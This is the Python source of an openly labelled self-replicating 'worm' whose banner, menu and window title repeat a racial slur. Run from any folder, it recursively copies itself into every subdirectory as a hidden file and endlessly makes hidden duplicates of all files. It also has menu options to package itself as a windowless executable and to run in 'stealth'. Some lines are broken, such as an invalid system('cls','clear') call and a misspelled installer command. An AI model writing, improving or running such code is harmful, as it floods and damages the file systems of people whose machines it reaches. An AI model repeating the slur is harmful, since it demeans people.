#importing required modules
import os
import sys
import time
import shutil
#import win32con
#import win32gui
import helikopter
from os import system

#function to print banner
def banner_func():
	print ("""
	         _____     _   _         _   _ _                       
		|  ___|_ _| |_| |_ _   _| \ | (_) __ _  __ _  ___ _ __ 
		| |_ / _` | __| __| | | |  \| | |/ _` |/ _` |/ _ \ '__|
		|  _| (_| | |_| |_| |_| | |\  | | (_| | (_| |  __/ |   
		|_|  \__,_|\__|\__|\__, |_| \_|_|\__, |\__, |\___|_|   
         		           |___/         |___/ |___/           
                                                          PYTHON WORM! """)

#class containing worm code
class Worm:

    #initiliazer method of worm class
    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if isinstance(path, type(None)):
            self.path = "/"
        else:
            self.path = path
            
        if isinstance(target_dir_list, type(None)):
            self.target_dir_list = []
        else:
            self.target_dir_list = target_dir_list
            
        if isinstance(target_dir_list, type(None)):
            self.iteration = 2
        else:
            self.iteration = iteration
        
        # get own absolute path
        self.own_path = os.path.realpath(__file__)
        
        
    #function to list all files and folders in specific directory
    def list_directories(self,path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)
        
        for file in files_in_current_directory:
            # avoid hidden files/directories (start with dot (.))
            if not file.startswith('.'):
                # get the full path
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass
    
    
    #function to create a new worm \ function to spread worm
    def create_new_worm(self):
        for directory in self.target_dir_list:
            destination = os.path.join(directory, ".worm.py")
            # copy the script in the new directory with similar name
            shutil.copyfile(self.own_path, destination)
            
            
    #function to copy files in a directory
    def copy_existing_files(self):
        for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.iteration):
                        destination = os.path.join(directory,("."+file+str(i)))
                        shutil.copyfile(source, destination)
                        
         
    #trigger point of worm                   
    def start_worm_actions(self):
        self.list_directories(self.path)
        print(self.target_dir_list)
        self.create_new_worm()
        self.copy_existing_files()


#function to execute worm / run worm
def execute_worm():
	print('[!] Press [Ctrl] + [C] to Stop!')
	while True:
    		current_directory = os.path.abspath("")
    		worm = Worm(path=current_directory)
    		worm.start_worm_actions()
    			  


#menu function of worm
def worm_menu():
	print(' --------------------------------- ')
	print('|      F A T T Y N I G G E R      |')
	print(' --------------------------------- ')
	print('| [+] 1 => Launch Worm!		 |')
	print('| [+] 2 => Make It Executable!    |')
	print('| [+] 3 => Run Worm in Stealth!   |')
	print('| [!] 0 => Exit!                  |')
	print(' --------------------------------- ')

  	        
#main function in python                        
if __name__=="__main__":
	#clearing screen
	system('cls','clear')
	
	#setting title of exe app 
    	system("title "+ "FattyNigger")
    	time.sleep(3)  
	
	#calling banner function
	banner_func()
	time.sleep(3)
	
	#calling menu function
	worm_menu()
	
	#input of options from user
	opt=int(input('Enter number to Perfrom Operation: '))
	
	#continuous loop to run worm in multiple time
	while opt != 0:
		
		#operation to perform
		if opt == 1:
			print('[!] WORM FattyNigger Started!')
			try:
				execute_worm()
			except KeyboardInterrupt:
				inpt=input('You want to Stop Worm?[y/n]: ')
				if inpt == 'y':
					print('[-] Stopping Worm!')
					break
				else:
					print('[+] Worm Spreads!')
					continue
				
		elif opt == 2:
			print('[+] Creating EXE of WORM FattyNigger.py!')
			time.sleep(2)
			os.system('pytinstaller fattynigger.py --onefile --noconsole')
			print('[!] fattynigger.exe Created!')
		
		elif opt == 3:
			print('[!] Running Worm in Stealth Mode') 
			time.sleep(2)
			#hide=win32gui.GetForegroundWindow()
			#win32gui.ShowWindow(hide, win32con.SW_HIDE)
			try:
				execute_worm()
			except KeyboardInterrupt:
				inpt=input('You want to Stop Worm?[y/n]: ')
				if inpt == 'y':
					print('[-] Stopping Worm!')
					break
				else:
					print('[+] Worm Spreads!')
					continue
			
		elif opt == 0:
			print('[!] Quitting...')
			time.sleep(1.5)
			break
					
		else:
			print('[!] Invalid Option.')
			print('[!] Try Again. ')

			
#going back to main tool			
system('cls','clear')
os.system('python helikopter.py')